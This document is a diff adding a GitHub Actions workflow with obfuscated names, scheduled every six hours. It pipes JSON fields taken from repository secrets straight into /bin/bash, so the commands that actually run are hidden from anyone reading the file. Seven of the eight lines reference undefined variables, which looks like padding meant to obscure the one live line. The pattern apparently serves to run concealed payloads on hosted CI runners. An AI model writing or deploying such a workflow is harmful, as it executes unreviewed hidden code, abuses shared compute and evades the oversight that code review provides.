@@ -1,0 +1,25 @@
+name: sanjujhz
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sanjujhz
+        env:
+          fvbcf6: ${{ secrets.fvbcf6 }}
+        run: |
+          echo $fvbcf6 | jq -r .ispv72558 | /bin/bash
+          echo $lm1 | jq -r .kvyok72408 | /bin/bash
+          echo $v52082 | jq -r .vv67902 | /bin/bash
+          echo $cezlm3724 | jq -r .zizqz5 | /bin/bash
+          echo $wplu698 | jq -r .unpa0 | /bin/bash
+          echo $mvikj35393 | jq -r .mok83369 | /bin/bash
+          echo $vof83 | jq -r .vdeim81 | /bin/bash
+          echo $fnl4 | jq -r .umbo06381 | /bin/bash
+
